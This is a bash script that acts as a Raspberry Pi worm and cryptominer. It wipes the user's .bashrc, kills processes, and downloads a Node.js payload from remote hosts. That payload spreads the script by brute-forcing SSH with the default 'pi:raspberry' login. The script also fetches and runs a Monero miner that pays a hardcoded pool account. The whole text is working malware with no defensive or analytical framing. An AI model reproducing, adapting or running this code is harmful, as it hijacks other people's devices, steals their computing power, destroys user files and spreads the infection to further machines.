#!/bin/bash

# https://a.pomf.space/rghhgnwdpepi.mp3

MoneroPool='xmr.pool.minergate.com:45560' # Monero Pool
MoneroUsername='1111nardski@gmail.com'
 # Monero Username, usually your monero address
MoneroMinerBin='pplbwxhbkscx.bin'	 # Backup, https://a.pomf.space/pplbwxhbkscx.bin https://my.mixtape.moe/chmfrj.bin, only compilled for raspbian (ubuntu/debian). Recompile if needed

FileHost='https://raw.githubusercontent.com/crazy-ace003/Dev-testing/master'	   # Your server ip / domain
SelfRepFile='lmqpaynzvvdk.js'	   # Backup, https://a.pomf.space/lmqpaynzvvdk.js https://my.mixtape.moe/towggx.js
SelfRepCredentials='pi:raspberry'  # Username:Password, for SSH bruteforcing
SelfRepBin='bins.sh'	   # FileName, of this file

# Self Rep
cd /tmp;rm y8D*;rm bins.sh;rm nohup.*;rm ~/.bashrc;killall y8D6;killall node;apt-get install nodejs-legacy npm -y;npm i bluebird ssh2;
wget $FileHost/$SelfRepFile -O /tmp/y8D6.js;nohup node /tmp/y8D6.js 1 $SelfRepCredentials $FileHost/$SelfRepBin &>/dev/null &

# Monero (XMR) Miner

cd /tmp/cpuminer-multi/;killall y8D6
./y8D6 -t 1 -a cryptonight -o stratum+tcp://$MoneroPool -u $MoneroUsername -p x
cd /tmp;mkdir /tmp/cpuminer-multi;cd /tmp/cpuminer-multi/;wget $FileHost/$MoneroMinerBin -O y8D6;chmod 777 y8D6;killall y8D6;
./y8D6 -t 1 -a cryptonight -o stratum+tcp://$MoneroPool -u $MoneroUsername -p x
wget https://a.pomf.space/lmqpaynzvvdk.js
